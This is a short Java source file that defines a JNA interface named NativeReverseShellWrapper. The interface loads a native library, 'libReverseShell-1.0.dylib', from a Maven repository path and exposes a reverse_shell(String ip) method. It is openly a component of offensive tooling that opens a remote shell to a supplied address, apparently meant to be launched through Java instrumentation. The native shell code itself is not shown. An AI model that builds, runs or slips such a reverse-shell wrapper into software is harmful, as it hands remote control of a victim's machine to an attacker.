package com.bdg.double07.reversecshell.instrumentation.reverseshell;

import com.sun.jna.Library;
import com.sun.jna.Native;

public interface NativeReverseShellWrapper extends Library{
    // LOAD THE NATIVE LIBRARY FROM ABSOLUTE PATH IN MAVEN'S REPOSITORY
    NativeReverseShellWrapper instance = (NativeReverseShellWrapper) Native.load(("/home/<your_user_account>/.m2/" +
            "repository/com/bdg/double07/reversecshell/instrumentation/reverseshell/libReverseShell/1.0/" +
            "libReverseShell-1.0.dylib"), NativeReverseShellWrapper.class);
    //static NativeAssembly nativeAssembly = new NativeAssembly();

    public void reverse_shell(String ip);

}